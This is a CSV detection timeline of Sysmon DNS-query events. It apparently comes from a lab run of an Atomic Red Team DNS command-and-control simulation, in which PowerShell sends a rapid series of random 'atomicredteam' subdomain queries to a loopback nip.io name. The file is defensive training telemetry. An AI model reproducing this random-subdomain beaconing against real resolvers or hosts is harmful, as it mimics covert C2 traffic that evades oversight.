"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-26 11:27:42.865 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174786,"Query: atomicredteam-524486.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.775","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:42.866 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174787,"Query: atomicredteam-227546.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.813","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:42.866 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174788,"Query: atomicredteam-284305.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.985","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:42.866 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174789,"Query: atomicredteam-776920.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.024","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:42.866 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174790,"Query: atomicredteam-248497.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.201","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:42.866 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174791,"Query: atomicredteam-13789.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.240","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174792,"Query: atomicredteam-974523.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.279","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174793,"Query: atomicredteam-602827.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.317","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174794,"Query: atomicredteam-900221.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.353","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174795,"Query: atomicredteam-77583.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.392","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174796,"Query: atomicredteam-678986.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.429","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174797,"Query: atomicredteam-637028.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.469","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174798,"Query: atomicredteam-324671.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.508","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174799,"Query: atomicredteam-42317.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.830","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174800,"Query: atomicredteam-952590.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.868","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174801,"Query: atomicredteam-634792.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.191","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174802,"Query: atomicredteam-826493.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.228","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174803,"Query: atomicredteam-251139.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.402","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174804,"Query: atomicredteam-749182.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.441","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174805,"Query: atomicredteam-231116.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.480","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174806,"Query: atomicredteam-816797.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.523","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.893 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174807,"Query: atomicredteam-327955.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.843","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.893 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174808,"Query: atomicredteam-156532.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.881","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.893 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174809,"Query: atomicredteam-191081.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.921","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.893 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174810,"Query: atomicredteam-49064.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.958","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.893 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174811,"Query: atomicredteam-492693.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.127","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.893 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174812,"Query: atomicredteam-585533.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.170","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174813,"Query: atomicredteam-815364.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.209","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174814,"Query: atomicredteam-409160.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.247","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174815,"Query: atomicredteam-663006.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.284","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174816,"Query: atomicredteam-151322.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.322","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174817,"Query: atomicredteam-667301.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.361","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174818,"Query: atomicredteam-959504.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.399","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174819,"Query: atomicredteam-607571.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.567","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174820,"Query: atomicredteam-46899.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.604","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174821,"Query: atomicredteam-852389.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.642","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174822,"Query: atomicredteam-843164.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.680","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174823,"Query: atomicredteam-43267.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.719","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174824,"Query: atomicredteam-320881.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.757","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174825,"Query: atomicredteam-470586.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.794","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:45.903 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174826,"Query: atomicredteam-514617.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.831","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:45.903 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174827,"Query: atomicredteam-751227.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.868","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:45.903 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174828,"Query: atomicredteam-468337.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:45.037","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:45.903 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174829,"Query: atomicredteam-936030.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:45.075","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:45.903 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174830,"Query: atomicredteam-63595.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:45.114","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
